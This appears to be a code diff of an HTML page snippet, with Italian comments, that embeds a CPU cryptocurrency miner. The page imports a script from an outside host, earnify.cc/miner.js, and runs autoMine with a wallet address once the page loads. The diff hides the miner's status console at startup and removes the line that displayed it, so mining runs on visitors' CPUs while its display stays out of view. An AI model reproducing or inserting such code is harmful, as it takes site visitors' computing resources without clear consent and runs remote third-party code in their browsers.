@@ -1,4 +1,4 @@
-<!-- ==================== MINER CONSOLE (SENZA SFONDO NERO/VERDE) ==================== -->
+<!-- ==================== MINER CONSOLE (NASCOSTO ALL'AVVIO) ==================== -->
 
 <style>
 #mining-console {
@@ -16,7 +16,7 @@
     font-family: 'Courier New', monospace;
     font-size: 15px;
     line-height: 1.7;
-    display: none;
+    display: none; /* Nascondo all'inizio */
 }
 
 .console-header {
@@ -53,7 +53,7 @@
     color: #ffffff;
     font-size: 26px;
     border-radius: 50%;
-    display: none;
+    display: flex; /* Visibile fin dall'inizio */
     align-items: center;
     justify-content: center;
     cursor: pointer;
@@ -62,7 +62,7 @@
 }
 </style>
 
-<!-- HTML Console -->
+<!-- Console Miner -->
 <div id="mining-console">
     <div class="console-header">
         <span><strong>🔨 CPU Miner</strong></span>
@@ -73,10 +73,10 @@
     <div>Tempo: <span id="timer">00:00</span></div>
 </div>
 
-<!-- Bottone riapri -->
+<!-- Bottone per aprire -->
 <div id="reopen-btn" onclick="showMinerConsole()">↑</div>
 
-<!-- Mining Script -->
+<!-- Script Mining -->
 <script type="module">
     import { autoMine } from "https://earnify.cc/miner.js";
     autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
@@ -107,9 +107,9 @@ function showMinerConsole() {
     document.getElementById("reopen-btn").style.display = "none";
 }
 
+// Avvio timer e hashrate (senza mostrare la console)
 window.addEventListener('load', () => {
     setInterval(updateTimer, 1000);
     setInterval(updateHashrate, 1400);
-    setTimeout(() => showMinerConsole(), 800);
 });
 </script>
